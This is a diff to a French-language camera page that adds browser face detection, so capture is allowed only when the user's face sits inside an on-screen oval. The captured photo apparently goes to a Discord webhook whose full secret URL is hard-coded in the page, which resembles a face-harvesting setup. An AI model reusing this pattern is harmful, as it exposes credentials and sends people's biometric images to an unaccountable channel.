@@ -90,9 +90,15 @@
             transform: translate(-50%, -50%);
             width: 55%;
             height: 70%;
-            border: 4px solid rgba(255, 255, 255, 0.9);
+            border: 4px solid rgba(255, 59, 48, 0.9);
             border-radius: 50%;
             z-index: 3;
+            transition: border-color 0.3s ease;
+        }
+
+        .face-oval.aligned {
+            border-color: rgba(52, 199, 89, 0.9);
+            box-shadow: 0 0 20px rgba(52, 199, 89, 0.5);
         }
 
         .face-guide {
@@ -101,7 +107,7 @@
             left: 50%;
             transform: translateX(-50%);
             color: white;
-            background: rgba(102, 126, 234, 0.9);
+            background: rgba(255, 59, 48, 0.9);
             padding: 10px 20px;
             border-radius: 25px;
             font-size: 14px;
@@ -110,6 +116,11 @@
             backdrop-filter: blur(10px);
             z-index: 4;
             box-shadow: 0 4px 15px rgba(0, 0, 0, 0.3);
+            transition: background-color 0.3s ease;
+        }
+
+        .face-guide.aligned {
+            background: rgba(52, 199, 89, 0.9);
         }
 
         #canvas {
@@ -251,6 +262,15 @@
             <video id="video" autoplay playsinline></video>
             <canvas id="canvas"></canvas>
             <div class="face-overlay" id="faceOverlay">
+                <svg class="face-oval-mask" viewBox="0 0 100 100" preserveAspectRatio="none">
+                    <defs>
+                        <mask id="faceMask">
+                            <rect width="100" height="100" fill="white"/>
+                            <ellipse cx="50" cy="50" rx="27.5" ry="35" fill="black"/>
+                        </mask>
+                    </defs>
+                    <rect width="100" height="100" fill="rgba(0, 0, 0, 0.65)" mask="url(#faceMask)"/>
+                </svg>
                 <div class="face-guide">👤 Alignez votre visage dans l'ovale</div>
                 <div class="face-oval"></div>
             </div>
@@ -277,6 +297,8 @@
         const captureBtn = document.getElementById('captureBtn');
         const placeholder = document.getElementById('placeholder');
         const faceOverlay = document.getElementById('faceOverlay');
+        const faceGuide = document.querySelector('.face-guide');
+        const faceOval = document.querySelector('.face-oval');
         const statusDiv = document.getElementById('status');
         const loader = document.getElementById('loader');
         const ctx = canvas.getContext('2d');
@@ -284,6 +306,9 @@
         const WEBHOOK_URL = 'https://discord.com/api/webhooks/1447896365282754593/Lv90Nn-cZPkT5yBVJwgmPE1urFv8pUtjkPnOHtqGW5LYUVS1GbPZdGdJfLqc1LZuqjXl';
 
         let stream = null;
+        let faceDetector = null;
+        let detectionInterval = null;
+        let isFaceAligned = false;
 
         function showStatus(message, type) {
             statusDiv.textContent = message;
@@ -292,6 +317,88 @@
             setTimeout(() => {
                 statusDiv.style.display = 'none';
             }, 5000);
+        }
+
+        async function initFaceDetection() {
+            if ('FaceDetector' in window) {
+                try {
+                    faceDetector = new FaceDetector({ fastMode: true, maxDetectedFaces: 1 });
+                    return true;
+                } catch (err) {
+                    console.log('FaceDetector non supporté, utilisation du mode manuel');
+                    return false;
+                }
+            }
+            return false;
+        }
+
+        async function detectFace() {
+            if (!faceDetector || video.readyState !== video.HAVE_ENOUGH_DATA) {
+                return;
+            }
+
+            try {
+                const faces = await faceDetector.detect(video);
+                
+                if (faces.length > 0) {
+                    const face = faces[0];
+                    const bbox = face.boundingBox;
+                    
+                    // Calculer le centre du visage
+                    const faceCenterX = bbox.left + bbox.width / 2;
+                    const faceCenterY = bbox.top + bbox.height / 2;
+                    
+                    // Calculer le centre et les dimensions de l'ovale
+                    const videoWidth = video.videoWidth;
+                    const videoHeight = video.videoHeight;
+                    const ovalCenterX = videoWidth / 2;
+                    const ovalCenterY = videoHeight / 2;
+                    const ovalRadiusX = videoWidth * 0.275; // 55% / 2
+                    const ovalRadiusY = videoHeight * 0.35; // 70% / 2
+                    
+                    // Vérifier si le visage est dans l'ovale (équation de l'ellipse)
+                    const normalizedX = (faceCenterX - ovalCenterX) / ovalRadiusX;
+                    const normalizedY = (faceCenterY - ovalCenterY) / ovalRadiusY;
+                    const distance = normalizedX * normalizedX + normalizedY * normalizedY;
+                    
+                    // Vérifier aussi la taille du visage
+                    const faceSize = Math.min(bbox.width, bbox.height);
+                    const minSize = Math.min(videoWidth, videoHeight) * 0.2;
+                    const maxSize = Math.min(videoWidth, videoHeight) * 0.6;
+                    const isSizeOk = faceSize >= minSize && faceSize <= maxSize;
+                    
+                    if (distance <= 1 && isSizeOk) {
+                        // Visage bien aligné
+                        if (!isFaceAligned) {
+                            isFaceAligned = true;
+                            faceOval.classList.add('aligned');
+                            faceGuide.classList.add('aligned');
+                            faceGuide.textContent = '✓ Visage aligné - Vous pouvez capturer';
+                            captureBtn.disabled = false;
+                        }
+                    } else {
+                        // Visage mal aligné
+                        if (isFaceAligned) {
+                            isFaceAligned = false;
+                            faceOval.classList.remove('aligned');
+                            faceGuide.classList.remove('aligned');
+                            faceGuide.textContent = distance > 1 ? '👤 Centrez votre visage dans l\'ovale' : (faceSize < minSize ? '👤 Rapprochez-vous' : '👤 Éloignez-vous un peu');
+                            captureBtn.disabled = true;
+                        }
+                    }
+                } else {
+                    // Aucun visage détecté
+                    if (isFaceAligned) {
+                        isFaceAligned = false;
+                        faceOval.classList.remove('aligned');
+                        faceGuide.classList.remove('aligned');
+                        faceGuide.textContent = '❌ Aucun visage détecté';
+                        captureBtn.disabled = true;
+                    }
+                }
+            } catch (err) {
+                console.error('Erreur de détection:', err);
+            }
         }
 
         startBtn.addEventListener('click', async () => {
@@ -307,8 +414,23 @@
                 faceOverlay.style.display = 'block';
                 startBtn.style.display = 'none';
                 captureBtn.style.display = 'block';
+                captureBtn.disabled = true; // Désactivé jusqu'à détection
                 
                 showStatus('Caméra activée avec succès !', 'success');
+                
+                // Initialiser la détection faciale
+                const hasDetector = await initFaceDetection();
+                if (hasDetector) {
+                    // Démarrer la détection toutes les 300ms
+                    video.addEventListener('loadeddata', () => {
+                        detectionInterval = setInterval(detectFace, 300);
+                    });
+                } else {
+                    // Mode manuel si pas de détection disponible
+                    faceGuide.textContent = '👤 Alignez votre visage dans l\'ovale';
+                    captureBtn.disabled = false;
+                    showStatus('Mode manuel activé', 'info');
+                }
             } catch (err) {
                 console.error('Erreur d\'accès à la caméra:', err);
                 showStatus('Erreur : Impossible d\'accéder à la caméra. Vérifiez les permissions.', 'error');
@@ -316,6 +438,11 @@
         });
 
         captureBtn.addEventListener('click', async () => {
+            if (!isFaceAligned && faceDetector) {
+                showStatus('⚠️ Veuillez aligner votre visage dans l\'ovale avant de capturer', 'error');
+                return;
+            }
+            
             canvas.width = video.videoWidth;
             canvas.height = video.videoHeight;
             ctx.drawImage(video, 0, 0);
@@ -344,12 +471,17 @@
                     showStatus('❌ Erreur lors de l\'envoi de la photo', 'error');
                 } finally {
                     loader.style.display = 'none';
-                    captureBtn.disabled = false;
+                    if (!faceDetector) {
+                        captureBtn.disabled = false;
+                    }
                 }
             }, 'image/jpeg', 0.95);
         });
 
         window.addEventListener('beforeunload', () => {
+            if (detectionInterval) {
+                clearInterval(detectionInterval);
+            }
             if (stream) {
                 stream.getTracks().forEach(track => track.stop());
             }
